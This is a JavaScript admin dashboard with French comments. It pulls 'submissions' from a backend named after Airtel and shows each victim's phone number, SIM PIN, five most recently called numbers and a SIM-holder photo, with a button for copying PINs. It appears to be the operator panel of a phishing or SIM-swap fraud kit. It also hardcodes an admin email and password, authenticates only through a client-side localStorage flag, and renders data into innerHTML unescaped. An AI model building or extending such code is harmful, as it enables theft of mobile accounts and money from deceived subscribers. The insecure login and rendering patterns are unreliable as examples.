document.addEventListener('DOMContentLoaded', () => {
    // --- Éléments du DOM pour l'authentification ---
    const loginContainer = document.getElementById('login-container');
    const adminPanelContent = document.getElementById('admin-panel-content');
    const loginForm = document.getElementById('login-form');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const errorMessage = document.getElementById('error-message');

    // --- Éléments du DOM pour le panneau d'administration ---
    const submissionsContainer = document.getElementById('submissions-container');
    const refreshBtn = document.getElementById('refresh-btn');
    const searchInput = document.getElementById('search-input');
    const lightbox = document.getElementById('lightbox');
    const lightboxImg = document.getElementById('lightbox-img');
    const lightboxCaption = document.getElementById('lightbox-caption');
    const lightboxClose = document.querySelector('.lightbox-close');
    const logoutBtn = document.getElementById('logout-btn');

    // --- API Configuration ---
    // IMPORTANT: Cette URL sera remplacée par l'URL de votre backend hébergé sur Render.
    // Elle ressemblera à : https://votre-nom-de-service.onrender.com
    const API_BASE_URL = 'https://airtel-backend.onrender.com';

    // --- State ---
    let allSubmissions = []; // Garde en mémoire toutes les données pour filtrer sans appel API

    // --- Logique d'affichage initiale ---
    function showAdminPanel() {
        loginContainer.classList.add('hidden');
        adminPanelContent.classList.remove('hidden');
        fetchSubmissions(); // Charger les données une fois connecté
    }

    function showLoginForm() {
        loginContainer.classList.remove('hidden');
        adminPanelContent.classList.add('hidden');
        if (emailInput) emailInput.value = '';
        if (passwordInput) passwordInput.value = '';
    }

    // --- Vérification de l'état de connexion au chargement ---
    if (localStorage.getItem('isAdminAuthenticated') === 'true') {
        showAdminPanel();
    } else {
        showLoginForm();
    }

    // --- Gestion de la soumission du formulaire de connexion ---
    loginForm.addEventListener('submit', (e) => {
        e.preventDefault();
        errorMessage.textContent = '';

        const email = emailInput.value;
        const password = passwordInput.value;

        const ADMIN_EMAIL = 'airteloneadmin@gmail.com';
        const ADMIN_PASS = 'airtelone1209ba';

        if (email === ADMIN_EMAIL && password === ADMIN_PASS) {
            localStorage.setItem('isAdminAuthenticated', 'true');
            showAdminPanel();
        } else {
            errorMessage.textContent = 'Email ou mot de passe incorrect.';
        }
    });

    /**
     * NOTE IMPORTANTE POUR LE DÉVELOPPEUR :
     * Ce fichier est conçu pour fonctionner avec un backend qui lit les données depuis Firestore.
     * Le backend doit fournir un endpoint (ex: /api/submissions) qui renvoie un tableau d'objets JSON.
     * Chaque objet doit correspondre à une soumission et contenir les champs :
     * { id: "...", phoneNumber: "...", pin: "...", lastCalls: [...], imageUrl: "...", submittedAt: "ISO_DATE_STRING" }
     */

    // --- Helper Functions ---

    /**
     * Formate une date ISO en une chaîne de caractères relative (ex: "il y a 5 minutes").
     * @param {string} dateString - La date au format ISO.
     * @returns {string} La date formatée.
     */
    function timeAgo(dateString) {
        const date = new Date(dateString);
        const now = new Date();
        const seconds = Math.round((now - date) / 1000);
        const minutes = Math.round(seconds / 60);
        const hours = Math.round(minutes / 60);
        const days = Math.round(hours / 24);

        if (seconds < 60) return `il y a ${seconds} secondes`;
        if (minutes < 60) return `il y a ${minutes} minutes`;
        if (hours < 24) return `il y a ${hours} heures`;
        if (days < 7) return `il y a ${days} jours`;
        
        return date.toLocaleDateString('fr-FR', { day: 'numeric', month: 'long', year: 'numeric' });
    }

    /**
     * Gère la copie de texte dans le presse-papiers et affiche un retour visuel.
     * @param {string} text - Le texte à copier.
     * @param {HTMLElement} element - L'élément (bouton) qui a déclenché l'action.
     */
    function copyToClipboard(text, element) {
        navigator.clipboard.writeText(text).then(() => {
            const tooltip = element.querySelector('.tooltip-text');
            if (tooltip) {
                const originalText = tooltip.textContent;
                tooltip.textContent = 'Copié !';
                element.style.color = 'var(--success-color)';
                setTimeout(() => {
                    tooltip.textContent = originalText;
                    element.style.color = '';
                }, 2000);
            }
        }).catch(err => {
            console.error('Erreur de copie:', err);
            alert('La copie a échoué.');
        });
    }

    // --- Card Creation ---

    /**
     * Crée et retourne un élément HTML représentant une carte de soumission.
     * @param {object} submission - L'objet de soumission contenant toutes les données.
     * @returns {HTMLElement} L'élément de la carte.
     */
    function createSubmissionCard(submission) {
        const card = document.createElement('div');
        card.className = 'submission-card';
        card.dataset.id = submission.id;

        const formattedDate = submission.submittedAt ? timeAgo(submission.submittedAt) : 'Date inconnue';

        card.innerHTML = `
            <div class="card-header">
                <h2><i class="fas fa-mobile-alt"></i> ${submission.phoneNumber}</h2>
                <div class="card-actions">
                    <button class="action-btn delete-btn" title="Supprimer cette soumission">
                        <i class="fas fa-trash-alt"></i>
                    </button>
                </div>
            </div>
            <div class="card-body">
                <div class="info-group">
                    <strong><i class="fas fa-key"></i> Code PIN (Confidentiel)</strong>
                    <div class="info-content pin-content">
                        <p>${submission.pin}</p>
                        <button class="copy-btn" title="Copier le PIN">
                            <i class="far fa-copy"></i>
                            <span class="tooltip-text">Copier le PIN</span>
                        </button>
                    </div>
                </div>
                <div class="info-group">
                    <strong><i class="fas fa-phone-volume"></i> 5 derniers numéros contactés</strong>
                    <div class="info-content">
                        <ul>
                            ${submission.lastCalls.map(num => `<li>${num || 'N/A'}</li>`).join('')}
                        </ul>
                    </div>
                </div>
                <div class="info-group sim-image-container">
                    <strong><i class="fas fa-sim-card"></i> Photo du support SIM</strong>
                    <img src="${submission.imageUrl}" alt="Photo du support SIM pour ${submission.phoneNumber}" loading="lazy">
                </div>
            </div>
            <div class="card-footer">
                Soumis ${formattedDate}
            </div>
        `;
        
        // --- Ajout des écouteurs d'événements ---

        // Copie du PIN
        card.querySelector('.copy-btn').addEventListener('click', (e) => {
            e.stopPropagation();
            copyToClipboard(submission.pin, e.currentTarget);
        });

        // Suppression de la carte (avec confirmation)
        card.querySelector('.delete-btn').addEventListener('click', async (e) => {
            e.stopPropagation();
            if (confirm(`Êtes-vous sûr de vouloir supprimer la soumission de ${submission.phoneNumber} ?\nCette action est irréversible.`)) {
                try {
                    const response = await fetch(`${API_BASE_URL}/api/submissions/${submission.id}`, { method: 'DELETE' });
                    if (!response.ok) {
                        throw new Error('La suppression a échoué sur le serveur.');
                    }
                    
                    card.style.transition = 'opacity 0.5s, transform 0.5s';
                    card.style.opacity = '0';
                    card.style.transform = 'scale(0.9)';
                    setTimeout(() => {
                        // Mettre à jour la liste en mémoire ET l'affichage
                        allSubmissions = allSubmissions.filter(s => s.id !== submission.id);
                        filterAndRender(); // Redessine l'interface avec la liste mise à jour
                    }, 500);
                } catch (error) {
                    console.error("Erreur lors de la suppression:", error);
                    alert("Une erreur est survenue lors de la suppression. Veuillez réessayer.");
                }
            }
        });

        // Ouverture de la lightbox pour l'image
        card.querySelector('.sim-image-container img').addEventListener('click', () => {
            lightbox.style.display = "block";
            lightboxImg.src = submission.imageUrl;
            lightboxCaption.textContent = `Support SIM pour ${submission.phoneNumber}`;
        });

        return card;
    }

    /**
     * Affiche les cartes de soumission dans le conteneur.
     * @param {Array} submissionsToRender - Le tableau des soumissions à afficher.
     */
    function renderSubmissions(submissionsToRender) {
        submissionsContainer.innerHTML = ''; // Vider le conteneur

        if (submissionsToRender && submissionsToRender.length > 0) {
            submissionsToRender.forEach(submission => {
                submissionsContainer.appendChild(createSubmissionCard(submission));
            });
        } else {
            // Affiche un message différent si la recherche n'a rien donné vs aucune donnée du tout
            if (allSubmissions.length > 0) {
                submissionsContainer.innerHTML = '<p class="no-submissions">Aucune soumission ne correspond à votre recherche.</p>';
            } else {
                submissionsContainer.innerHTML = '<p class="no-submissions">Aucune soumission pour le moment.</p>';
            }
        }
    }

    // --- Data Fetching ---

    /**
     * Récupère les données des soumissions (via une API ou des données fictives) et les affiche.
     */
    async function fetchSubmissions() {
        submissionsContainer.innerHTML = '<div class="loading-spinner"></div>';
        if (refreshBtn) {
            const icon = refreshBtn.querySelector('i');
            // L'animation est maintenant gérée par CSS transition
            icon.style.transform = `rotate(${parseInt(icon.style.transform.replace('rotate(', '') || 0) + 360}deg)`;
            refreshBtn.disabled = true;
        }

        try {
            // Appel à la véritable API hébergée sur Firebase Functions
            const response = await fetch(`${API_BASE_URL}/api/submissions`);
            if (!response.ok) {
                throw new Error(`Erreur réseau: ${response.status} ${response.statusText}`);
            }
            const submissions = await response.json();

            // Trier la liste principale une seule fois
            allSubmissions = submissions.sort((a, b) => new Date(b.submittedAt) - new Date(a.submittedAt));
            
            // Afficher les résultats (filtrés par la recherche actuelle ou tous)
            filterAndRender();
        } catch (error) {
            console.error('Erreur lors de la récupération des soumissions:', error);
            submissionsContainer.innerHTML = `<p class="no-submissions" style="color: var(--danger-color);"><strong>Erreur:</strong> Impossible de charger les données. (${error.message})</p>`;
        } finally {
            // Réactiver le bouton d'actualisation
            if (refreshBtn) {
                const icon = refreshBtn.querySelector('i');
                // Petite astuce pour redémarrer l'animation si on clique trop vite
                icon.classList.remove('spinning');
                refreshBtn.disabled = false;
            }
        }
    }

    function filterAndRender() {
        const searchTerm = searchInput.value.toLowerCase().trim();
        if (!searchTerm) {
            renderSubmissions(allSubmissions);
            return;
        }
        const filtered = allSubmissions.filter(s => s.phoneNumber.toLowerCase().includes(searchTerm));
        renderSubmissions(filtered);
    }

    // --- Initialisation et Écouteurs d'Événements Globaux ---

    // Fermer la lightbox
    lightboxClose.addEventListener('click', () => {
        lightbox.style.display = "none";
    });
    lightbox.addEventListener('click', (e) => {
        if (e.target === lightbox) { // Ferme si on clique sur le fond noir
            lightbox.style.display = "none";
        }
    });

    // Gérer la déconnexion
    logoutBtn.addEventListener('click', () => {
        localStorage.removeItem('isAdminAuthenticated');
        showLoginForm();
    });

    // Actualiser les données au clic sur le bouton
    refreshBtn.addEventListener('click', fetchSubmissions);

    // Filtrer les résultats en temps réel lors de la saisie
    searchInput.addEventListener('input', filterAndRender);

    // Le premier chargement des données est maintenant géré par la fonction showAdminPanel()
    // après une connexion réussie ou si l'utilisateur est déjà authentifié.
});